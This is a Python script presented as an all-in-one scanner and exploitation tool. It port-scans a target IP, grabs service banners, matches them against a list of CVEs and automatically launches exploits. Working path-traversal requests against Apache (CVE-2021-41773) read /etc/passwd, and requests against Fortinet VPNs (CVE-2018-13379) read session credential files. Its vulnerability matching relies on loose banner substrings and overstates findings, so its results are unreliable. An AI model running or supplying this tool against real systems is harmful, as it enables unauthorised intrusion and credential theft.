#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#   SAQR - Security Scanner & Exploitation Tool
#   Version: 1.0
#   Author: Black
#   Usage: python saqr.py <IP>
# ============================================================

import socket
import ssl
import sys
import json
import time
import re
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# COLORS
# ============================================================
class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

# ============================================================
# BANNER
# ============================================================
BANNER = f"""
{C.CYAN}{C.BOLD}
    ███████╗ █████╗  ██████╗ ██████╗ 
    ██╔════╝██╔══██╗██╔═══██╗██╔══██╗
    ███████╗███████║██║   ██║██████╔╝
    ╚════██║██╔══██║██║▄▄ ██║██╔══██╗
    ███████║██║  ██║╚██████╔╝██║  ██║
    ╚══════╝╚═╝  ╚═╝ ╚═══╝ ╚═╝  ╚═╝

        ███████╗ ██╗   ██╗ ██████╗ ███████╗██████╗ 
        ██╔════╝ ╚██╗ ██╔╝██╔════╝ ██╔════╝██╔══██╗
        ███████╗  ╚████╔╝ ██║      █████╗  ██████╔╝
        ╚════██║   ╚██╔╝  ██║      ██╔══╝  ██╔══██╗
        ███████║    ██║   ╚██████╗ ███████╗██║  ██║
        ╚══════╝    ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝

              Security Scanner & Exploitation Tool
                        Version 1.0
                     Made by: Black
{C.RESET}
{C.YELLOW}        Security Scanner & Exploitation Tool
{C.WHITE}                    Version 1.0
{C.MAGENTA}                Made by: Black
{C.RESET}
"""

# ============================================================
# CONFIG
# ============================================================
MAX_WORKERS_PORT = 500
MAX_WORKERS_CVE = 50
TIMEOUT_PORT = 1
TIMEOUT_BANNER = 3
START_PORT = 1
END_PORT = 65535

# ============================================================
# SERVICES
# ============================================================
SERVICES = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
    143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
    465: "SMTPS", 514: "Syslog", 587: "SMTP", 631: "IPP", 636: "LDAPS",
    993: "IMAPS", 995: "POP3S", 1080: "SOCKS", 1433: "MSSQL", 1521: "Oracle",
    1723: "PPTP", 2049: "NFS", 2082: "cPanel", 2083: "cPanel SSL",
    2181: "Zookeeper", 2375: "Docker", 2376: "Docker SSL", 3000: "Grafana",
    3306: "MySQL", 3389: "RDP", 4443: "HTTPS Alt", 5000: "Flask",
    5432: "PostgreSQL", 5601: "Kibana", 5672: "RabbitMQ", 5900: "VNC",
    5984: "CouchDB", 6379: "Redis", 6443: "Kubernetes", 7001: "WebLogic",
    7002: "WebLogic SSL", 8000: "HTTP Alt", 8080: "HTTP Proxy",
    8081: "HTTP Alt", 8086: "InfluxDB", 8088: "Hadoop", 8090: "HTTP Alt",
    8161: "ActiveMQ", 8443: "HTTPS Alt", 8888: "HTTP Alt", 9000: "PHP-FPM",
    9001: "Supervisor", 9042: "Cassandra", 9090: "Prometheus", 9092: "Kafka",
    9200: "Elasticsearch", 9300: "Elasticsearch", 9418: "Git", 9999: "HTTP Alt",
    10000: "Webmin", 11211: "Memcached", 15672: "RabbitMQ Mgmt",
    27017: "MongoDB", 27018: "MongoDB", 50000: "SAP", 50070: "Hadoop",
    61616: "ActiveMQ",
}

# ============================================================
# VULNERABILITY DATABASE
# ============================================================
VULN_DB = [
    # SSH
    {"cve": "CVE-2024-6387", "service": "SSH", "port": 22, "pattern": "OpenSSH_9", "desc": "regreSSHion RCE", "severity": "CRITICAL", "exploit": False},
    {"cve": "CVE-2020-15778", "service": "SSH", "port": 22, "pattern": "OpenSSH", "desc": "SCP Command Injection", "severity": "HIGH", "exploit": True},
    {"cve": "CVE-2018-15473", "service": "SSH", "port": 22, "pattern": "OpenSSH", "desc": "Username Enumeration", "severity": "MEDIUM", "exploit": True},

    # HTTP
    {"cve": "CVE-2021-41773", "service": "HTTP", "port": 80, "pattern": "Apache/2.4.49", "desc": "Path Traversal RCE", "severity": "CRITICAL", "exploit": True},
    {"cve": "CVE-2021-42013", "service": "HTTP", "port": 80, "pattern": "Apache/2.4.50", "desc": "Path Traversal RCE", "severity": "CRITICAL", "exploit": True},
    {"cve": "CVE-2021-44228", "service": "HTTP", "port": 80, "pattern": "log4j", "desc": "Log4Shell RCE", "severity": "CRITICAL", "exploit": False},
    {"cve": "CVE-2019-11043", "service": "HTTP", "port": 80, "pattern": "nginx", "desc": "PHP-FPM RCE", "severity": "CRITICAL", "exploit": False},
    {"cve": "CVE-2022-22965", "service": "HTTP", "port": 80, "pattern": "Spring", "desc": "Spring4Shell RCE", "severity": "CRITICAL", "exploit": False},

    # SMB
    {"cve": "CVE-2017-0144", "service": "SMB", "port": 445, "pattern": "SMB", "desc": "EternalBlue RCE", "severity": "CRITICAL", "exploit": False},
    {"cve": "CVE-2020-0796", "service": "SMB", "port": 445, "pattern": "SMB", "desc": "SMBGhost RCE", "severity": "CRITICAL", "exploit": False},

    # RDP
    {"cve": "CVE-2019-0708", "service": "RDP", "port": 3389, "pattern": "RDP", "desc": "BlueKeep RCE", "severity": "CRITICAL", "exploit": False},

    # Databases
    {"cve": "CVE-2012-2122", "service": "MySQL", "port": 3306, "pattern": "MySQL", "desc": "MySQL Auth Bypass", "severity": "HIGH", "exploit": True},
    {"cve": "CVE-2019-9193", "service": "PostgreSQL", "port": 5432, "pattern": "PostgreSQL", "desc": "PostgreSQL RCE", "severity": "HIGH", "exploit": True},
    {"cve": "CVE-2022-0543", "service": "Redis", "port": 6379, "pattern": "Redis", "desc": "Redis Lua RCE", "severity": "CRITICAL", "exploit": True},
    {"cve": "CVE-2019-2386", "service": "MongoDB", "port": 27017, "pattern": "MongoDB", "desc": "MongoDB Auth Bypass", "severity": "HIGH", "exploit": False},
    {"cve": "CVE-2015-1427", "service": "Elasticsearch", "port": 9200, "pattern": "Elasticsearch", "desc": "Elasticsearch RCE", "severity": "CRITICAL", "exploit": True},

    # Web Apps
    {"cve": "CVE-2018-7600", "service": "HTTP", "port": 80, "pattern": "Drupal", "desc": "Drupalgeddon2 RCE", "severity": "CRITICAL", "exploit": True},
    {"cve": "CVE-2019-1003000", "service": "HTTP", "port": 8080, "pattern": "Jenkins", "desc": "Jenkins RCE", "severity": "CRITICAL", "exploit": False},
    {"cve": "CVE-2021-26084", "service": "HTTP", "port": 80, "pattern": "Confluence", "desc": "Confluence RCE", "severity": "CRITICAL", "exploit": True},
    {"cve": "CVE-2021-22205", "service": "HTTP", "port": 80, "pattern": "GitLab", "desc": "GitLab RCE", "severity": "CRITICAL", "exploit": False},

    # Network
    {"cve": "CVE-2019-19781", "service": "HTTPS", "port": 443, "pattern": "Citrix", "desc": "Citrix ADC RCE", "severity": "CRITICAL", "exploit": True},
    {"cve": "CVE-2020-5902", "service": "HTTPS", "port": 443, "pattern": "F5", "desc": "F5 BIG-IP RCE", "severity": "CRITICAL", "exploit": True},
    {"cve": "CVE-2018-13379", "service": "HTTPS", "port": 443, "pattern": "Fortinet", "desc": "Fortinet Path Traversal", "severity": "CRITICAL", "exploit": True},

    # Docker
    {"cve": "CVE-2019-5736", "service": "Docker", "port": 2375, "pattern": "Docker", "desc": "Docker RCE", "severity": "CRITICAL", "exploit": True},
]

# ============================================================
# HELPERS
# ============================================================
def print_info(msg):
    print(f"{C.BLUE}[*]{C.RESET} {msg}")

def print_success(msg):
    print(f"{C.GREEN}[+]{C.RESET} {msg}")

def print_warning(msg):
    print(f"{C.YELLOW}[!]{C.RESET} {msg}")

def print_error(msg):
    print(f"{C.RED}[-]{C.RESET} {msg}")

def print_vuln(msg):
    print(f"{C.RED}{C.BOLD}[VULN]{C.RESET} {msg}")

def print_exploit(msg):
    print(f"{C.MAGENTA}{C.BOLD}[EXPLOIT]{C.RESET} {msg}")

# ============================================================
# PORT SCANNING
# ============================================================
def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT_PORT)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port if result == 0 else None
    except Exception:
        return None

def scan_all_ports(ip):
    print_info(f"Scanning ports {START_PORT}-{END_PORT}...")
    print_info(f"Threads: {MAX_WORKERS_PORT}")

    open_ports = []
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS_PORT) as executor:
        futures = {executor.submit(scan_port, ip, port): port for port in range(START_PORT, END_PORT + 1)}
        for future in as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
                elapsed = time.time() - start_time
                print_success(f"Port {result} OPEN ({elapsed:.1f}s)")

    print_success(f"Total open ports: {len(open_ports)}")
    return sorted(open_ports)

# ============================================================
# BANNER GRABBING
# ============================================================
def get_banner(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT_BANNER)
        sock.connect((ip, port))

        if port in [443, 8443, 4443, 9443, 6443, 2376, 7002]:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=ip)
            except Exception:
                pass

        if port in [80, 8080, 8000, 8888, 3000, 5000, 9000, 9090, 9200, 5601]:
            sock.send(b"GET / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
        elif port not in [22, 21, 3306, 5432, 6379, 27017]:
            sock.send(b"\r\n")

        banner = sock.recv(4096).decode(errors="ignore")
        sock.close()
        return banner.strip()[:500]
    except Exception:
        return None

# ============================================================
# VULNERABILITY DETECTION
# ============================================================
def check_vulnerability(ip, port, banner):
    findings = []
    if not banner:
        return findings

    for vuln in VULN_DB:
        if vuln["port"] == port or (port in [80, 8080, 8000] and vuln["port"] in [80, 8080, 8000]):
            if vuln["pattern"].lower() in banner.lower():
                findings.append(vuln)
    return findings

def scan_vulnerabilities(ip, open_ports):
    print_info("Scanning for vulnerabilities...")
    all_findings = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS_CVE) as executor:
        futures = {}
        for port in open_ports:
            banner = get_banner(ip, port)
            futures[executor.submit(check_vulnerability, ip, port, banner)] = (port, banner)

        for future in as_completed(futures):
            port, banner = futures[future]
            findings = future.result()
            for vuln in findings:
                vuln["port"] = port
                vuln["banner"] = banner[:200] if banner else None
                all_findings.append(vuln)
                print_vuln(f"{vuln['cve']} | {vuln['desc']} | {vuln['severity']} | Port {port}")

    print_success(f"Total vulnerabilities: {len(all_findings)}")
    return all_findings

# ============================================================
# EXPLOITATION
# ============================================================
def attempt_exploit(ip, vuln):
    print_exploit(f"Attempting exploit {vuln['cve']} on port {vuln['port']}...")

    result = {
        "cve": vuln["cve"],
        "port": vuln["port"],
        "success": False,
        "method": None,
        "output": None
    }

    try:
        if vuln["cve"] == "CVE-2021-41773":
            result["method"] = "Apache Path Traversal"
            try:
                import urllib.request
                url = f"http://{ip}:{vuln['port']}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as response:
                    data = response.read().decode(errors="ignore")
                    if "root:" in data:
                        result["success"] = True
                        result["output"] = data[:500]
                        print_success(f"Exploit successful! Read /etc/passwd")
                    else:
                        result["output"] = "No data retrieved"
            except Exception as e:
                result["output"] = f"Failed: {e}"

        elif vuln["cve"] == "CVE-2018-13379":
            result["method"] = "Fortinet Path Traversal"
            try:
                import urllib.request
                url = f"https://{ip}:{vuln['port']}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=5, context=context) as response:
                    data = response.read().decode(errors="ignore")
                    if "var fgt_lang" in data:
                        result["success"] = True
                        result["output"] = data[:500]
                        print_success(f"Exploit successful! Read sslvpn_websession")
                    else:
                        result["output"] = "No data retrieved"
            except Exception as e:
                result["output"] = f"Failed: {e}"

        else:
            result["method"] = "Unknown"
            result["output"] = "No automatic exploit available"

    except Exception as e:
        result["output"] = f"Error: {e}"

    if result["success"]:
        print_success(f"Exploit successful: {vuln['cve']}")
    else:
        print_warning(f"Exploit failed: {vuln['cve']}")

    return result

def exploit_vulnerabilities(ip, findings):
    print_info("Attempting exploitation...")
    results = []

    for vuln in findings:
        if vuln.get("exploit", False):
            result = attempt_exploit(ip, vuln)
            results.append(result)
        else:
            print_warning(f"Skipping {vuln['cve']} - no automatic exploit")

    return results

# ============================================================
# REPORT
# ============================================================
def generate_report(ip, open_ports, findings, exploits):
    report = {
        "target": ip,
        "timestamp": datetime.now().isoformat(),
        "scan_config": {
            "port_range": f"{START_PORT}-{END_PORT}",
            "timeout": TIMEOUT_PORT,
            "workers": MAX_WORKERS_PORT
        },
        "open_ports": open_ports,
        "total_open_ports": len(open_ports),
        "vulnerabilities": findings,
        "total_vulnerabilities": len(findings),
        "exploits": exploits,
        "total_exploits": len([e for e in exploits if e["success"]]),
    }

    filename = f"report_{ip.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print_success(f"Report saved to: {filename}")
    return filename, report

def print_report(report):
    print("\n" + "=" * 60)
    print(f"{C.CYAN}{C.BOLD}              SCAN REPORT - SAQR{C.RESET}")
    print("=" * 60)

    print(f"\n{C.WHITE}Target:{C.RESET} {report['target']}")
    print(f"{C.WHITE}Timestamp:{C.RESET} {report['timestamp']}")
    print(f"{C.WHITE}Open Ports:{C.RESET} {report['total_open_ports']}")
    print(f"{C.WHITE}Vulnerabilities:{C.RESET} {report['total_vulnerabilities']}")
    print(f"{C.WHITE}Successful Exploits:{C.RESET} {report['total_exploits']}")

    print(f"\n{C.CYAN}{'=' * 60}{C.RESET}")
    print(f"{C.BOLD}Open Ports:{C.RESET}")
    for port in report["open_ports"]:
        service = SERVICES.get(port, "Unknown")
        print(f"  - {port}/tcp ({service})")

    print(f"\n{C.CYAN}{'=' * 60}{C.RESET}")
    print(f"{C.BOLD}Vulnerabilities:{C.RESET}")
    if report["vulnerabilities"]:
        for v in report["vulnerabilities"]:
            sev_color = C.RED if v["severity"] == "CRITICAL" else C.YELLOW
            print(f"  [{sev_color}{v['severity']}{C.RESET}] {v['cve']} - {v['desc']}")
            print(f"         Port: {v['port']} | Service: {v['service']}")
            if v.get("banner"):
                print(f"         Banner: {v['banner'][:100]}")
    else:
        print("  No vulnerabilities found")

    print(f"\n{C.CYAN}{'=' * 60}{C.RESET}")
    print(f"{C.BOLD}Exploitation Results:{C.RESET}")
    if report["exploits"]:
        for e in report["exploits"]:
            status = f"{C.GREEN}SUCCESS{C.RESET}" if e["success"] else f"{C.RED}FAILED{C.RESET}"
            print(f"  [{status}] {e['cve']} - {e['method']}")
            if e.get("output"):
                print(f"         Output: {e['output'][:100]}")
    else:
        print("  No exploitation attempts")

    print("\n" + "=" * 60)

# ============================================================
# MAIN
# ============================================================
def main():
    os.system("clear" if os.name != "nt" else "cls")
    print(BANNER)

    if len(sys.argv) != 2:
        print_error(f"Usage: python {sys.argv[0]} <IP>")
        print_info(f"Example: python {sys.argv[0]} 192.168.0.100")
        sys.exit(1)

    ip = sys.argv[1]
    try:
        socket.inet_aton(ip)
    except socket.error:
        print_error("Invalid IP")
        sys.exit(1)

    print_info(f"Target: {ip}")
    print_info(f"Starting scan...")
    print("=" * 60)

    # 1. Port scan
    open_ports = scan_all_ports(ip)

    if not open_ports:
        print_error("No open ports found")
        sys.exit(1)

    # 2. Vulnerability scan
    findings = scan_vulnerabilities(ip, open_ports)

    # 3. Exploitation
    exploits = []
    if findings:
        exploits = exploit_vulnerabilities(ip, findings)
    else:
        print_warning("No vulnerabilities to exploit")

    # 4. Report
    filename, report = generate_report(ip, open_ports, findings, exploits)
    print_report(report)

    print_success(f"Scan complete. Report: {filename}")

if __name__ == "__main__":
    main()